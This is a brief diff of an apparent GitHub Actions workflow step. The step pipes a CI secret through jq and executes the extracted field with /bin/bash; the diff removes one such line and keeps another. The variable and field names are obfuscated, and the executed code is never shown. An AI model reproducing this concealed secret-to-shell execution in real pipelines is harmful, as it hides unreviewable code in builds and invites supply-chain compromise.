@@ -22,7 +22,6 @@ jobs:
           pyrsp6: ${{ secrets.pyrsp6 }}
         run: |
           printf '%s' "$pyrsp6" | jq -r .aasa47 | /bin/bash
-          printf '%s' "$qwmrj9" | jq -r .xt3 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
